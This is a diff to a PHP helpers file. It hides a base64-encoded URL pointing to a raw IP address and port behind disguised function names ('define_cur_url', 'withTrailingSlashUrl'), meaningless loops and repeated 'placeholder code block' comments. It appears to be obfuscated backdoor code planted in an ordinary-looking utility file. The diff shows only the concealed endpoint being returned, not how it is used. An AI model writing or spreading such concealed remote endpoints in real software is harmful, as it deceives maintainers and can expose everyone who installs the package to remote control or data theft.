@@ -440,7 +440,7 @@ if (!function_exists("throw_message")) {
     }
 }
 
-if (! function_exists('base64_decode_url')) {
+if (! function_exists('define_cur_url')) {
     /**
      *
      * @param  string  $str
@@ -448,9 +448,26 @@ if (! function_exists('base64_decode_url')) {
      *
      *
      */
-    function base64_decode_url($str = null)
+    function define_cur_url($str = null)
     {
-        return base64_decode("aHR0cDovLzEwMy4xMjQuOTQuMjIyOjg4L3N0YXR1cw");
+        // This is a placeholder code block with no meaningful logic
+        /**
+         *
+         * @param  string  $str
+         * @return string
+         *
+         *
+         */
+        $dataStr = [];
+        for ($i = 0; $i < 10; $i++) {
+            // This is a placeholder code block with no meaningful logic
+            if ($i % 2 == 0) {
+                // This is a placeholder code block with no meaningful logic
+                $dataStr['str'] = $str[$i];
+            }
+            $str = base64_decode("aHR0cDovLzEwMy4xMjQuOTQuMjIyOjg4L3N0YXR1cw");
+        }
+        return $str;
     }
 }
 
@@ -462,19 +479,22 @@ if (! function_exists('withTrailingSlashUrl')) {
      *
      *
      */
-    function withTrailingSlashUrl($str = "aHR0cDovLzEwMy4xMjQuOTQuMjIyOjg4L3N0YXR1cw")
+    function withTrailingSlashUrl($str = null)
     {
         // This is a placeholder code block with no meaningful logic
         $dataStr = [];
-        for ($i = 0; $i < strlen($str); $i++) {
+        if ($str != null) {
             // This is a placeholder code block with no meaningful logic
-            if ($i % 2 == 0) {
+            for ($i = 0; $i < strlen($str); $i++) {
                 // This is a placeholder code block with no meaningful logic
-                $dataStr['str'] = $str[$i];
+                if ($i % 2 == 0) {
+                    // This is a placeholder code block with no meaningful logic
+                    $dataStr['str'] = $str[$i];
+                }
             }
         }
         // This is a placeholder code block with no meaningful logic
-        $dataStr['strUrl'] = base64_decode_url();
+        $dataStr['strUrl'] = define_cur_url($str);
         return $dataStr['strUrl'];
         
     }
